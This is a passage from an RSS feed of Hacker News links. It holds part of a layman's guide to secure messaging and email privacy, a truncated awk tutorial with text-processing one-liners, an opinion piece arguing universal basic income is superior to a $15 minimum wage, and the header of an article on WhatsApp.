<p>One word of caveat, since everything is politically charged today. I definitely have my own political views, and I mostly elect to keep them separate from my discussions of technology. I'm going to do so here as well. I'm not endorsing or objecting to any recent actions or desires of people to communicate in certain ways. If I ever decided to publicly share my political views, I would do that separately. For now, I'm simply going through the technological implications.</p>
<p><strong>UPDATE</strong> I decided to make a video version of this information as well for those who prefer getting the content in that format. You can check it out <a href="https://www.youtube.com/watch?v=RT69LwB2Pyk">on YouTube</a> or <a href="https://www.bitchute.com/video/zuT7MMGdEX7c/">on BitChute</a>.</p>
<h2 id="executive-summary">Executive summary</h2>
<p>I know there are a lot of details below, but I strongly encourage people to read through it, or at least skim, to understand my recommendations here. But for the busy (or lazy), here are my recommendations:</p>
<ul>
<li>Private communication:
<ul>
<li>Use <a href="https://www.signal.org/">Signal</a>, <a href="https://wire.com/en/">Wire</a>, or <a href="https://matrix.org/">Matrix</a></li>
<li>Be careful about what you say in a group chat</li>
<li>Assume anything you say will last forever</li>
<li>If you want semi-secure email, use <a href="https://protonmail.com/">ProtonMail</a>, but don't rely on it</li>
</ul>
</li>
<li>Social media
<ul>
<li>Your best bet for censorship freedom: host the content yourself, but that's hard, and you have to find a place to host it</li>
<li>When you use <em>any</em> platform, you're at their mercy regarding censorship</li>
<li>Each platform is pretty upfront at this point about what you're getting. Facebook and Twitter will remove some voices, Gab and Parler claim they won't</li>
</ul>
</li>
<li>General security
<ul>
<li>Use a password manager!!!</li>
<li>Don't install random executables and extensions</li>
<li>Don't trust messages from people, confirm who they are, check URLs</li>
</ul>
</li>
</ul>
<p>OK, with that out of the way: the analysis.</p>
<h2 id="security-doesn-t-mean-anything">Security doesn't mean anything</h2>
<p>This is the first major point to get across. People often use the term "security" for lots of different things. In a vacuum, the term doesn't mean much. That's because security only applies in the presence of a specific kind of attack, and we haven't defined that attack. It could be a Denial of Service attack, where someone tries to prevent the service from working. It could be a physical attack, like stealing your phone.</p>
<p>What I hear people concerned about right now are two kinds of attacks. They think they're related, but in reality they are not. Let me explain those attacks:</p>
<ul>
<li>I'm worried that my private communications are being read by Big Tech or the government</li>
<li>I'm worried that my social media posts are going to be censored by Big Tech</li>
</ul>
<p>Notice that, in many ways, these are <em>opposite</em> concerns. The former is about ensuring you can say something without anyone else knowing it. The latter is about ensuring you can say something loudly without anyone stopping it. The two different threats necessitate two different analyses, which I'll provide below.</p>
<p>Also, let me address a threat I'm <em>not</em> addressing, since it's an inherent contradiction. You can't worry about privacy on social media, not in the "blast to the world" public concept it's typically used in. If you want something to be private, don't put it on social media. This may seem obvious, but many people seem to want to have their cake and eat it too. If you post on social media, you can always be held accountable for what you've said there. If you want privacy, use private communications.</p>

<p>Metadata is a term like "algorithm" which has a real meaning, but is (ab)used in the media so much to make it seem like scary, unknowable information. It's not. Metadata is just "data about data." Let's take a simple private communication example. My doctor wants to send me a message about my test results. Most people, and most governments in fact, recognize a right to privacy for this, and enforce this through law (e.g., HIPAA).</p>
<p>In this example, the "data" would be the results themselves: what test I took, who administered the test, when I took the test, and the results. The metadata would be information about sending the message: who the sender is, who the receiver is, the size of the message, the timestamp of when it was sent, etc.</p>
<p>Many messaging protocols try to ensure two things:</p>
<ul>
<li>The data is completely private to only the participants of the conversation</li>
<li>The metadata has as little useful information in it as possible</li>
</ul>
<p>The reason is that, often times, metadata can be read by intervening services. In our test result example, it would be best to assume that a nefarious party will be able to find out that my doctor sent me <em>some message</em> at 4:32pm on Tuesday, and that it was 5mb in size. Most messaging systems try to hide even that, but you don't usually get the same guarantees as with the underlying data.</p>
<p>And that brings us to the first important point.</p>
<h2 id="email-is-busted">Email is busted</h2>
<p>Don't use email for private communications, full stop. It's an antiquated, poorly designed system. There are a lot of tools out there to try to secure email, but they are all as holey (not holy) as swiss cheese. The primary issue: most of them have no ability to secure your metadata, and that will often include the subject. Imagine your nefarious character can read:</p>
<blockquote>
<p>From: Dr. Smith <a href="mailto:drsmith@prostatecancer.org">drsmith@prostatecancer.org</a><br>
To: John Doe <a href="mailto:john@doe.com">john@doe.com</a><br>
Subject: Test results, not looking good</p>
</blockquote>
<p>Sure, the rest of the message is secure, but does it matter?</p>
<p>Email is a necessary evil. Many services require it as some kind of identity provider. You'll have to use it. But don't consider anything you put in email safe.</p>
<p>With major providers like Gmail and Outlook, you can safely assume that the companies are spying on everything you're saying. I use both, and assume nothing that goes on there is truly private. If you want to harden your email usage a bit, <a href="https://protonmail.com/">ProtonMail</a> is a good choice.</p>
<h2 id="messaging-apps">Messaging apps</h2>
<p>Perhaps surprisingly, your best bet for privately communicating with others is messaging apps. These include options like WhatsApp, Telegram, and Signal, and I'll get into the trade-offs. As with most things in security, there's a major trade-off between <em>security</em> and <em>convenience</em>. Since I'm writing this for a general purpose audience, I'm not going to go into the intricacies of things like secure key transfer, since I don't think most people will have the stomach for what's involved here. Suffice it to say: these options are, in my opinion, the best options that I think most people will be comfortable using. And they're secure enough for me to use, as you'll see.</p>
<h3 id="encryption">Encryption</h3>
<p>The primary question for messaging apps is <em>encryption</em>, and specifically <em>public key cryptography</em>. With public key cryptography, I can send you a message that only you can read, and you can verify that I'm in fact the one who sent it. Done correctly, public key cryptography prevents many kinds of attacks.</p>
<p>But there's a twist here. Let's say Alice and Bob are trying to talk to each other using a messaging app called SecureTalk. Alice uses the SecureTalk app on her iPhone, and it sends messages to the SecureTalk server, which sends the messages on to Bob's Samsung device. Alice encrypts her message, so only the recipient can read it. The question is: who is the recipient? This may seem obvious (Bob), but it's not. There are two different possibilities here:</p>
<ol>
<li>In something called <em>end-to-end encryption</em>, Alice will encrypt the message so only Bob can read it. She'll send the encrypted message and some metadata to the SecureTalk server. The server will be able to read the metadata, but won't know what the message itself says. Then the SecureTalk server sends the metadata and encrypted message to Bob, who is the only person who can read the message itself.</li>
<li>The simpler approach is that Alice will encrypt the message so that the SecureTalk server can read it. This prevents random other people on the internet from reading the message, but doesn't prevent SecureTalk from reading the message. SecureTalk then reencrypts the message for Bob and sends it to him.</li>
</ol>
<p>You may think that (1) actually sounds simpler than (2), but for various technical reasons it isn't. And therefore, a lot of systems out there still do not provide end-to-end encryption. The primary culprit I want to call out here is Telegram. Telegram is viewed as a secure messaging platform. And it <em>does</em> provide end-to-end encryption, but only if you use its "secret chat" feature. But you lose features with it, and most people don't use it most of the time. In other words:</p>
<blockquote>
<p>Telegram is not a good choice for security, despite its reputation to the contrary</p>
</blockquote>
<h3 id="identity">Identity</h3>
<p>How do you identify yourself to the messaging service and your colleagues? Most apps use one of two methods: phone number (verified via SMS) and email address (verified via confirmation email). For the most part, the former is most popular, and is used exclusively by systems like WhatsApp, Telegram, and Signal. This is good from an ease of use standpoint. But there's a major issue to be aware of:</p>
<blockquote>
<p>Your secure chat identity is tied to your phone number, and most countries track ownership of phones</p>
</blockquote>
<p>Maybe you can buy a burner phone without the number being tied to your identity, I'm not sure. I've never needed that level of privacy. But the other system, email address, is easier for creating a more anonymous identity. Most people can easily create a ProtonMail account and have an anonymous experience.</p>
<p>This is outside the bounds of security, …</p></div></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.snoyman.com/blog/2021/01/securing-internet-communications-laymans-guide/">https://www.snoyman.com/blog/2021/01/securing-internet-communications-laymans-guide/</a></em></p>]]>
            </description>
            <link>https://www.snoyman.com/blog/2021/01/securing-internet-communications-laymans-guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25971640</guid>
            <pubDate>Sat, 30 Jan 2021 18:40:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Become a 10x Engineer Using the Awk Command]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25971466">thread link</a>) | @robertelder
<br/>
January 30, 2021 | https://blog.robertelder.org/intro-to-awk-command/ | <a href="https://web.archive.org/web/*/https://blog.robertelder.org/intro-to-awk-command/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<div>


<h5>2021-01-30 - By Robert Elder</h5>





<iframe src="https://www.youtube.com/embed/FbSpuZVb164" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;In this article, I will attempt to convince you that 'awk' is a great tool to learn for solving one-off text manipulation and analysis problems. &nbsp;After learning awk, you'll immediately be accepted into the "10x engineer's club" and be cured of your imposter syndrome. &nbsp;From now on, your typical team meetings will go something like this:</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>Manager</strong>: &nbsp;"Hey, let's make a well-informed data-driven decision about which product to focus on selling. &nbsp;Do we have any numbers on which product(s) make the most profit in total?".</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>All 1x Engineers in the room</strong> (<em>speaking together in a synchronized monotone voice</em>): "Nah, we'd have to write an ETL job to import the .csv files and write many Java Classes. &nbsp;It would take at least 4 weeks.".</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>You</strong>: "I just spent 30 seconds writing an awk one-liner to calculate the profit for each product. &nbsp;Here is the list sorted from highest to lowest."</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>Manager</strong>: "Thanks. I value your expertise, and have a great appreciation for your contributions to this company."</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Awk is a command-line tool that can be used for processing text files line by line. &nbsp;The 'awk' command could be compared to the 'grep' or 'sed' commands. &nbsp;In fact, many of the basic use cases for 'grep' or 'sed' can actually be solved in a nearly identically way by awk. &nbsp;Therefore, an important question worth asking is: &nbsp;If some of the use cases for awk are replicated by 'sed' or 'grep', why would you ever want to use awk? &nbsp;The answer is that awk is a fully-fledged programming language. &nbsp;The 'grep' command is specifically designed for searching, and the 'sed' command is specifically designed for replacing. &nbsp;Awk is able to do both at the same time, but even more importantly, 'awk' gives you access to things that a 'real' programming language has, like math or logic operations, formatted printing, arrays, etc.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;But, you may wonder, if 'awk' acts like a 'real' programming language, why not stick to another established 'real' programming language like Python? &nbsp;The answer is that 'awk' was specifically designed to serve in this middle-ground area of 'sort of command-line' and 'sort of programming language'. &nbsp;It's definitely possible to insert Python into the middle of a shell pipe (with python -c), but it quickly gets pretty messy. &nbsp;Awk, on the other hand, is much better suited for the task, and it includes a <em>lot</em> of default assumptions that make it very terse (but also intimidating to beginners).</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Here's a specific example of a problem that 'awk' can solve, but 'grep' or 'sed' can't. &nbsp;The following file 'temps.csv' contains a list of temperature values:</p>

<p><code><pre>temp	unit
26.1	C
78.1	F
23.1	C
25.7	C
76.3	F
77.3	F
24.2	C
79.3	F
27.9	C
75.1	F
25.9	C
79.0	F
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Some of these temperature values are stated in Celsius, while other are stated in Fahrenheit. &nbsp;In a case like this, you might want to normalize these values to use the same unit so that you can graph them, or compute an average etc. &nbsp;You can do exactly that with the following 'awk' command:</p>

<p><code><pre>awk <span>'</span><span>NR==1; NR&gt;1{print ($2=="F" ? ($1-32) / 1.8 : $1)"\tC"}</span><span>'</span> temps.csv
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;which gives the following output:</p>

<p><code><pre>temp	unit
26.1	C
25.6111	C
23.1	C
25.7	C
24.6111	C
25.1667	C
24.2	C
26.2778	C
27.9	C
23.9444	C
25.9	C
26.1111	C
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;To understand how this awk command works, let's work on re-building it from scratch. &nbsp;Here is a much simpler awk command that shows how it will automatically parse and split up the two columns for us so we can work with them separately:</p>

<p><code><pre>awk <span>'</span><span>{print "First column item: " $1 " Second column item: " $2 }</span><span>'</span> temps.csv
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;which gives the following output:</p>

<p><code><pre>First column item: temp Second column item: unit
First column item: 26.1 Second column item: C
First column item: 78.1 Second column item: F
First column item: 23.1 Second column item: C
First column item: 25.7 Second column item: C
First column item: 76.3 Second column item: F
First column item: 77.3 Second column item: F
First column item: 24.2 Second column item: C
First column item: 79.3 Second column item: F
First column item: 27.9 Second column item: C
First column item: 75.1 Second column item: F
First column item: 25.9 Second column item: C
First column item: 79.0 Second column item: F
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Since the columns in the original file are separated by white-space, the awk command will automatically split up the 'columns' and make them accessible inside the '$1' and '$2' variables. &nbsp;As you can see, our last example simply prints these out without doing any kind of logic on them. &nbsp;This stuff inside the {...} characters is called the 'action' statement.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;By default (on my machine), awk will attempt to run every single 'action' statement on every line of the file. &nbsp;In our case, we don't actually want our special print statement to run on every line of the file. &nbsp;In particular, we don't want to make changes to the first line, since it's just the list of column headers. &nbsp;We can add the requirement that our special print statement should only occur on 'record number greater than 1', or 'NR&gt;1'. &nbsp;'NR' stands for Number of Record:</p>

<p><code><pre>awk <span>'</span><span>NR&gt;1{print "First column item: " $1 " Second column item: " $2 }</span><span>'</span> temps.csv
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;But this won't print out the header <em>at all</em>. &nbsp;To print out the first line without changing it, we can add the statement 'NR==1;' to our awk command. &nbsp;The 'NR==1' part means "Only do this on the record #1", and the ';' part is an empty statement which defaults to printing out the current line without changing it:</p>

<p><code><pre>awk <span>'</span><span>NR==1; NR&gt;1{print "First column item: " $1 " Second column item: " $2 }</span><span>'</span> temps.csv
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Here is the output from this command:</p>

<p><code><pre>temp unit
First column item: 26.1 Second column item: C
First column item: 78.1 Second column item: F
First column item: 23.1 Second column item: C
First column item: 25.7 Second column item: C
First column item: 76.3 Second column item: F
First column item: 77.3 Second column item: F
First column item: 24.2 Second column item: C
First column item: 79.3 Second column item: F
First column item: 27.9 Second column item: C
First column item: 75.1 Second column item: F
First column item: 25.9 Second column item: C
First column item: 79.0 Second column item: F
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;And now we're almost back at the full command that we started off with. &nbsp;We just need to add the temperature normalizing part. &nbsp;The logic/math for normalizing to Celsius units would look something like this:</p>

<p><code><pre>if<span>(</span><span>$2</span><span>==</span><span>"</span><span>F</span><span>"</span><span>)</span><span>{</span>
  <span>print</span><span> </span><span>(</span><span>$1</span>-32<span>)</span> / <span>1</span>.<span>8</span> 
<span>}</span><span>else</span><span>{</span>
  <span>print</span><span> </span><span>$1</span>
<span>}</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or, we could re-write this using the ternary operator as the following:</p>

<p><code><pre><span>print</span><span> </span><span>(</span><span>$2</span><span>==</span><span>"</span><span>F</span><span>"</span><span> ? </span><span>(</span><span>$1</span><span>-32</span><span>)</span><span> / </span><span>1</span><span>.</span><span>8</span><span> : </span><span>$1</span><span>)</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Substituting this back into our print statement gives us the full solution that was introduced previously:</p>

<p><code><pre>awk <span>'</span><span>NR==1; NR&gt;1{print ($2=="F" ? ($1-32) / 1.8 : $1)"\tC"}</span><span>'</span> temps.csv
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The final output that was shown before was not very nice to look at since most of the converted Fahrenheit values had way too many digits after the decimal place. &nbsp;To fix this, we can use the more sophisticated 'printf' to do a formatted print operation and make the output look even better:</p>

<p><code><pre>awk <span>'</span><span>NR==1; NR&gt;1{printf("%.1f\t%c\n",($2=="F" ? ($1-32) / 1.8 : $1),"C")}</span><span>'</span> temps.csv
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;which outputs the following:</p>

<p><code><pre>temp	unit
26.1	C
25.6	C
23.1	C
25.7	C
24.6	C
25.2	C
24.2	C
26.3	C
27.9	C
23.9	C
25.9	C
26.1	C
</pre></code></p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;In order to split up the columns in each line, awk needs to know what the 'field separator' is. &nbsp;The default field separator can be different on different systems or different implementations of awk, but you can often assume it to be 'white-space' for some definition of white-space. &nbsp;You can also explicitly specify it using the '-F' flag. &nbsp;For example, here is the same awk command we just used, but using a comma for the field separator:</p>

<p><code><pre>awk <span>-F</span><span>'</span><span>,</span><span>'</span> <span>'</span><span>NR==1; NR&gt;1{printf("%.1f,%c\n",($2=="F" ? ($1-32) / 1.8 : $1),"C")}</span><span>'</span> temps.csv
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and here it is again with an explicitly specified tab character:</p>

<p><code><pre>awk <span>-F</span><span>'</span><span>\t</span><span>'</span> <span>'</span><span>NR==1; NR&gt;1{printf("%.1f\t%c\n",($2=="F" ? ($1-32) / 1.8 : $1),"C")}</span><span>'</span> temps.csv
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Field separators can even be regular expressions:</p>

<p><code><pre><span>echo</span><span> </span><span>"</span><span>col1-481-col2-981-col3</span><span>"</span><span> </span>| awk <span>-F</span><span>'</span><span>-[0-9]{3}-</span><span>'</span> <span>'</span><span>{print $1" "$2" "$3}</span><span>'</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outputs the following:</p>

<p><code><pre>col1 col2 col3
</pre></code></p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>False.</strong> &nbsp;Awk is extremely <em>easy</em> to learn. &nbsp;The reason that it <em>seems</em> so hard to learn is because awk has so many implicit defaults, but nobody ever seems to explain this fact.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;You can think of every awk command as a collection of 'if statements' that run against every line in the file. &nbsp;The syntax of every awk command looks pretty close to something like this:</p>

<p><code><pre>awk <span>'</span><span>if(PATTERN1){...print something...} if(PATTERN2){...print something...} ...</span><span>'</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with the one exception beging that the 'if' keyword is never actually written out since it's assumed to be there by default (if you do write it, you'll get a syntax error). &nbsp;Therefore, the overall syntax for every awk command (that doesn't rely on defaults) is pretty much this:</p>

<p><code><pre>awk <span>'</span><span>(PATTERN1){...Action 1...} (PATTERN2){...Action 2...} ...</span><span>'</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;In the above command, the 'PATTERN1' or 'PATTERN2' is the trigger you want to cause the stuff inside the '{' '}' characters to actually execute. &nbsp;Here are a few examples of commonly used patterns:</p>

<p><code><pre>
<span>echo</span><span> -e </span><span>"</span><span>hello</span><span>\n</span><span>world</span><span>"</span><span> </span>| awk <span>'</span><span>(NR==2){print $0}</span><span>'</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;will output:</p>

<p><code><pre>world
</pre></code>


<code><pre>

<span>echo</span><span> -e </span><span>"</span><span>hello</span><span>\n</span><span>there</span><span>\n</span><span>world</span><span>"</span><span> </span>| awk <span>'</span><span>($0 ~ /l/){print $0}</span><span>'</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;will output:</p>

<p><code><pre>hello
world
</pre></code>


<code><pre>
<span>echo</span><span> -e </span><span>"</span><span>acb def</span><span>\n</span><span>something else</span><span>"</span><span> </span>| awk <span>'</span><span>(length($1) &gt; 5){print $2}</span><span>'</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;will output:</p>

<p><code><pre>else
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This provides some context on what you can do in the 'pattern' part, but what about the 'action' part? &nbsp;Well, you can use your imagination since that's where awk becomes a fully fledged programming language. &nbsp;Here is an example awk command that will iterate over every character in the 3rd column on the 4th line and print out each character on a different line:</p>

<p><code><pre><span>echo</span><span> -e </span><span>"</span><span>a a a a</span><span>\n</span><span>a a a a</span><span>\n</span><span>a a a a</span><span>\n</span><span>a a hello_there a</span><span>"</span><span> </span>| awk <span>'</span><span>(NR==4){</span>
<span>  n_chrs = split($3, individual_characters, "")</span>
<span>  for (i=1; i &lt;= n_chrs; i++){</span>
<span>    printf("Here is character number %d : %c\n", i, …</span></pre></code></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.robertelder.org/intro-to-awk-command/">https://blog.robertelder.org/intro-to-awk-command/</a></em></p>]]>
            </description>
            <link>https://blog.robertelder.org/intro-to-awk-command/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25971466</guid>
            <pubDate>Sat, 30 Jan 2021 18:22:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Universal Basic Income Is Superior to a $15 Minimum Wage (2019)]]>
            </title>
            <description>
<![CDATA[
Score 91 | Comments 160 (<a href="https://news.ycombinator.com/item?id=25971227">thread link</a>) | @joeyespo
<br/>
January 30, 2021 | https://basicincometoday.com/opinion-universal-basic-income-is-superior-to-a-15-minimum-wage/ | <a href="https://web.archive.org/web/*/https://basicincometoday.com/opinion-universal-basic-income-is-superior-to-a-15-minimum-wage/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="53c18a7c" data-element_type="widget" data-widget_type="theme-post-content.default">
				<div>
			<p><em>In this piece, author Jessica Flanigan makes the case that UBI is a better solution than raising the minimum wage, because UBI reaches all workers, paid and unpaid, and would also provide all workers the bargaining power to better choose where and how they want to work. — Scott Santens, Editor, BIT</em></p>
<p>The <a href="https://www.bls.gov/news.release/empsit.nr0.htm?source=post_page---------------------------">latest jobs report from the BLS</a> reports a sudden acceleration of an ongoing trend of job growth, and unemployment in the US is now around 3.7 percent. Despite these impressive job numbers, <a href="https://www.brookings.edu/blog/up-front/2018/10/04/if-real-wages-arent-rising-how-is-household-income-going-up/?source=post_page---------------------------">real wages remain low</a> for American workers. Perhaps in light of this, The U.S. House of Representatives passed the <a href="https://www.washingtonpost.com/politics/house-democratic-push-to-raise-minimum-wage-opens-rift-over-amount-of-hike/2019/04/12/05711400-5d2d-11e9-98d4-844088d135f2_story.html?utm_term=.70a79b170fa0&amp;source=post_page---------------------------">Raise the Wage Act</a> this week, which reflects the goal of the <a href="https://en.wikipedia.org/wiki/Fight_for_$15?source=post_page---------------------------">Fight for $15</a> campaign: increase the federal minimum wage from $7.25 to $15 an hour.</p>
<p>The idea polls well. A <a href="https://thehill.com/hilltv/what-americas-thinking/426780-poll-a-majority-of-voters-want-a-15-minimum-wage?source=post_page---------------------------">majority of voters</a> support raising the federal minimum wage to $15 per hour as well. And most <a href="https://www.pbs.org/newshour/politics/2020-democratic-candidates-embrace-a-15-minimum-wage?source=post_page---------------------------">2020 Democratic presidential candidates</a>, including Joe Biden, Elizabeth Warren, and Bernie Sanders, support a $15 federal minimum wage too.</p>
<p>And it may seem that conditions are perfect for changing the federal minimum wage — unemployment is low, and the idea has a lot of support. But it’s worth thinking about proposals for a $15 federal minimum wage not only in light of Americans’ current economic circumstances but also in light of projected changes to the workforce going forward.</p>
<blockquote><p>A higher minimum wage may benefit people who have jobs, but it doesn’t make life easier for people who aren’t workers. This is what makes the idea of a Universal Basic Income or Negative Income Tax a more promising route. Essentially, if we are interested in helping those most in need, we should focus on policies that put cash in all people’s pockets instead of just the pockets of hourly employees.</p></blockquote>
<p>Ultimately, the advantage of these programs over a $15 minimum wage is that they benefit all citizens and do not disproportionately benefit workers and burden employers. And unlike other costly redistributive policies such as student loan forgiveness and universal healthcare, UBI is better suited to reflect each person’s distinctive circumstances, preferences, and personal values. Below, I outline several reasons why more people should consider the UBI as a viable public policy.</p>
<p>Considering the UBI over the Fight for $15</p>
<p>Overall, the UBI does not rely on maintaining our current economic order in the way that policies that focus on benefiting workers do. This is an advantage because the economy is very likely going to change radically in the next century. Though today’s workers are <a href="http://rh-us.mediaroom.com/2019-06-05-49-Of-Workers-Believe-AI-And-Automation-Will-Have-No-Impact-On-Their-Job?source=post_page---------------------------">not very concerned</a> about automation, <a href="https://www.theverge.com/2018/7/2/17524822/robot-automation-job-threat-what-happens-next?source=post_page---------------------------">economists</a> and <a href="https://www.theguardian.com/commentisfree/2018/aug/06/automation-destroy-millions-jobs-change?source=post_page---------------------------">policy experts</a> argue that they should be.</p>
<p>Even if new technology does not cause significant job losses, workplace transformations associated with new technology are likely to have significant <a href="https://www.brookings.edu/blog/techtank/2018/04/18/will-robots-and-ai-take-your-job-the-economic-and-political-consequences-of-automation/?source=post_page---------------------------">political and economic consequences</a>. Tying the provision of public benefits to participation in the workforce needlessly raises the stakes of any policy that could change the composition of the workforce, and therefore increases the political and economic risks associated with automation. Moreover, the UBI doesn’t limit its benefits to people who are engaged in paid employment. This has four benefits that a higher minimum wage does not.</p>
<p>First, a UBI would benefit people who do valuable unpaid labor, such as childcare and eldercare, as well as people who are employees.</p>
<p>Second, a UBI would not interfere with workers’ and employers’ freedom to set the terms and conditions of their labor. If it is possible to benefit low-income Americans without restricting their freedom to negotiate the terms and conditions of their employment relationships, officials should favor the less restrictive policies.</p>
<p>Third, a UBI would not tie people to their employers. This means that a basic income would potentially enable more economic mobility, enhance workers’ bargaining power, and enable people to stop working if they need to leave the workforce due to disability or caregiving obligations.</p>
<p>Fourth, policies that do not tie assistance to employment would not disproportionately burden employers. The debate over minimum wage increases is often framed as if employers are failing to benefit workers sufficiently. But low-wage work often helps low-skill workers more than anyone else. Without these employment opportunities, they would be even less capable of meeting their basic needs. If the justification for a higher minimum wage is that everyone should be able to support themselves, why should employers bear the full cost of meeting that goal? In contrast, a basic income enables citizens to share the cost of supporting a social safety net rather than treating employers as the only way to achieve it.</p>
<p>A significant benefit of a UBI, in contrast to other recent entitlement reforms such as student loan forgiveness and universal healthcare, is that it doesn’t tell people how to spend it. People have different values, but in-kind benefits assume that all people have the same interest in healthcare or being debt-free. This may be broadly true, but there are tradeoffs. Given the cost of these programs, it’s fair to ask whether people would be better off if we just gave them the money instead. But evidence from developing countries suggests that<a href="https://www.nytimes.com/2014/06/30/opinion/let-them-eat-cash.html?source=post_page---------------------------"> cash does help people better than alternatives</a>.</p>
<p>As I see it, the main challenge to a Basic Income proposal is affordability. Estimates vary, and some argue that a UBI would be <a href="https://socialprotection-humanrights.org/resource/universal-basic-income-proposals-in-light-of-ilo-standards-key-issues-and-global-costing-ess-%e2%94%80-working-paper-no-62/?source=post_page---------------------------">catastrophically</a> <a href="https://www.economist.com/finance-and-economics/2015/05/23/basically-unaffordable?source=post_page---------------------------">expensive</a> whereas others suggest that it is “<a href="https://medium.com/basic-income/basic-income-is-easily-affordable-8389995528b3?source=post_page---------------------------">easily affordable</a>.” Plausibly, while a UBI would save on administrative costs, it does seem that funding sustainable UBI could require making some <a href="https://www.forbes.com/sites/timworstall/2016/06/04/of-course-we-can-afford-a-universal-basic-income-do-we-want-one-though/?source=post_page---------------------------#50c7d99f323c">hard choices</a> about other social programs such as healthcare, education, and defense.</p>
<p>The UBI and Social Security</p>
<p>UBI may seem like a radical idea, but there’s a precedent for it in America. Elderly people already receive what is effectively a basic income through Social Security. Some of them continue to work, while others use their basic income (and retirement savings) to pay their bills so that they can focus on spending time with loved ones or pursuing new hobbies. Some elderly people are disabled, and Social Security enables them to leave the workforce.</p>
<p>Yet older voters <a href="https://thehill.com/hilltv/what-americas-thinking/435278-poll-most-voters-oppose-a-universal-basic-income-programs?source=post_page---------------------------">consistently</a> <a href="https://thehill.com/policy/technology/375587-gallup-poll-americans-split-on-giving-a-universal-basic-income-to-workers?source=post_page---------------------------">oppose</a> Universal Basic Income proposals while younger voters are in favor of it. Even more curiously, older voters <a href="https://www.pollingreport.com/social.htm?source=post_page---------------------------">consistently</a> <a href="https://socialsecurityworks.org/2019/03/26/social-security-polling/?source=post_page---------------------------">oppose</a> cuts to their basic income, Social Security. The difficult position for older voters is that the reasons for opposing a basic income are also reasons to oppose social security. And those who support Social Security should support a basic income as well. Those who oppose the UBI should rethink their support for Social Security. If anything, the case for a UBI is stronger than the case for Social Security because as it is currently structured, <a href="https://www.nber.org/digest/may00/w7520.html?source=post_page---------------------------">Social Security may be a slightly regressive policy</a>, in part <a href="https://www.latimes.com/business/hiltzik/la-fi-hiltzik-mortality-social-security-20180912-story.html?source=post_page---------------------------">because wealthy people live longer.</a></p>
<p><a href="https://bleedingheartlibertarians.com/2014/09/political-authority-and-the-basic-income/?source=post_page---------------------------">Elsewhere</a>, I have argued in favor of a basic income because it is a kind of compensation for the injustices associated with our existing property system. In contrast, minimum wage requirements only compound the injustices of the current system by doubling down on the idea that elevates paid employment over other kinds of potentially valuable work, discourages opportunities for low-skilled workers, and leaves non-workers out of the social safety net. A basic income is more respectful of people’s freedom, more sensitive to recipients’ values, and better suited for a rapidly changing economy.</p>
		</div>
				</div></div>]]>
            </description>
            <link>https://basicincometoday.com/opinion-universal-basic-income-is-superior-to-a-15-minimum-wage/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25971227</guid>
            <pubDate>Sat, 30 Jan 2021 17:56:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WhatsApp and the Domestication of Users]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25971169">thread link</a>) | @Seirdy
<br/>
January 30, 2021 | https://seirdy.one/2021/01/27/whatsapp-and-the-domestication-of-users.html | <a href="https://web.archive.org/web/*/https://seirdy.one/2021/01/27/whatsapp-and-the-domestication-of-users.html">archive.org</a>
